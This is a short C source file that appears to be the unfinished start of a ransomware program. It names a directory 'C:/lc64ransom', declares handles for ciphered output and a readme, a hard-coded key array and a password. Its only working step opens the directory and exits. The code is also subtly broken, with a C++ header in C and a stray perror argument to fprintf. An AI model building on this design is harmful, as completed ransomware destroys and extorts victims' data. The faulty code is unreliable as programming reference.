#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <stdarg.h>
#include <lib/dirent.h>
#include <sys/types.h>

#define AND &
#define XOR ^
#define NOT !

int i = 0;

FILE *buffer;
FILE *cipherHered;
FILE *readme;

float key[10] = 
{
    0.65, 
    100, 
    0.365, 
    0, 
    25.9, 
    999, 
    5, 
    12.58, 
    7.0214, 
    103.126 
};

float pre_calculated;

char path[] = 
{
    "C:/lc64ransom"
};

struct data_chars 
{
    char currentChar;
    char cipheredChar;
    char preCipheredChar;
} data;

struct cipher_attrib
{
    int password;
    char file[500];
    char c_file[500];
    char readmsg[500];
} c_attrib;

int main(void)
{
    DIR *dir;
    struct dirent *direntp;

    c_attrib.password = 900;

    dir = opendir(path);

    if (dir == NULL)
    {
        fprintf(stderr, "ERROR: Cannot open the files directory\n", perror);
        exit(EXIT_FAILURE);
    }
    return 0;
}